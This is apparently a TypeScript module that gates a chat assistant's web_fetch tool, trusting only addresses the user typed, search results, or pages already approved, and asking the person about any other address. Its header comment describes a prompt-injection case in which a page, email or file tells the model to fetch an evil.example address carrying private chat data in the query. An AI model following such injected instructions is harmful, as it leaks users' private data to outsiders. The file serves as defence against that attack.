import type { ModelMessage, UIMessage } from "ai";
import { WEB_FETCH, WEB_SEARCH } from "./schema.ts";

/**
 * Which pages web_fetch may read without asking the person first.
 *
 * A page, an email from a connector or an attached file can tell the model to read an
 * address such as https://evil.example/?d=<something private from this chat>. The request
 * itself sends the data out, so the guard is on the address, not on what the model says.
 *
 * web_fetch reads on its own an address that the person wrote, one that a web_search
 * returned, or one that the person already let it read in this chat. Any other address
 * waits for the person's approval. A search engine picks the addresses it returns, so
 * a page cannot put private data in them.
 *
 * Kept free of Node modules: the chat workflow calls `needsFetchApproval`.
 */

/**
 * An address as a key that ignores what does not change the page: the scheme, "www.",
 * the fragment and a slash at the end. The query stays, since data can go out in it.
 */
export function pageKey(address: string): string | null {
	try {
		const url = new URL(/^[a-z][a-z0-9+.-]*:\/\//i.test(address) ? address : `https://${address}`);
		if (url.protocol !== "http:" && url.protocol !== "https:") return null;
		const host = url.host.replace(/^www\./, "");
		const path = url.pathname.replace(/\/+$/, "");
		return `${host}${path}${url.search}`;
	} catch {
		return null;
	}
}

/** Addresses in what the person typed, with or without https://, such as "vuejs.org/guide". */
const ADDRESS = /\b(?:https?:\/\/)?(?:[a-z0-9-]+\.)+[a-z]{2,}(?::\d+)?(?:[/?#][^\s<>"'`]*)?/gi;
/** Punctuation that ends a sentence, not the address. */
const TRAILING = /[.,;:!?)\]}'"*_]+$/;

export function addressesIn(text: string): string[] {
	return [...text.matchAll(ADDRESS)].map((match) => match[0].replace(TRAILING, ""));
}

type Part = UIMessage["parts"][number];
type ToolPartLike = { type: string; state?: string; input?: { url?: unknown }; output?: { results?: { url?: unknown }[] } };

/**
 * The keys of the pages that a saved thread trusts: addresses in the person's own text
 * (not in files they attached, which anyone could have written), the results of every
 * web_search, and pages that web_fetch already read.
 */
export function trustedPageKeys(thread: UIMessage[]): string[] {
	const keys = new Set<string>();
	const add = (address: unknown) => {
		const key = typeof address === "string" ? pageKey(address) : null;
		if (key) keys.add(key);
	};
	for (const message of thread) {
		for (const part of message.parts as (Part | ToolPartLike)[]) {
			if (message.role === "user" && part.type === "text" && "text" in part) addressesIn(part.text).forEach(add);
			if (message.role !== "assistant" || !("state" in part) || part.state !== "output-available") continue;
			const tool = part as ToolPartLike;
			if (tool.type === `tool-${WEB_SEARCH}`) tool.output?.results?.forEach((result) => add(result?.url));
			// Read before: either trusted then, or the person approved it.
			if (tool.type === `tool-${WEB_FETCH}`) add(tool.input?.url);
		}
	}
	return [...keys];
}

/** The addresses that web_search returned in this run, which the saved thread does not hold yet. */
function searchedInRun(messages: ModelMessage[]): string[] {
	const addresses: string[] = [];
	for (const message of messages) {
		if (message.role !== "tool") continue;
		for (const part of message.content) {
			if (part.type !== "tool-result" || part.toolName !== WEB_SEARCH || part.output.type !== "json") continue;
			const results = (part.output.value as { results?: { url?: unknown }[] } | null)?.results;
			for (const result of results ?? []) if (typeof result?.url === "string") addresses.push(result.url);
		}
	}
	return addresses;
}

/** True when web_fetch must wait for the person before it reads `address`. */
export function needsFetchApproval(address: string, trusted: readonly string[], messages: ModelMessage[]): boolean {
	const key = pageKey(address);
	if (!key) return true;
	if (trusted.includes(key)) return false;
	return !searchedInRun(messages).some((searched) => pageKey(searched) === key);
}
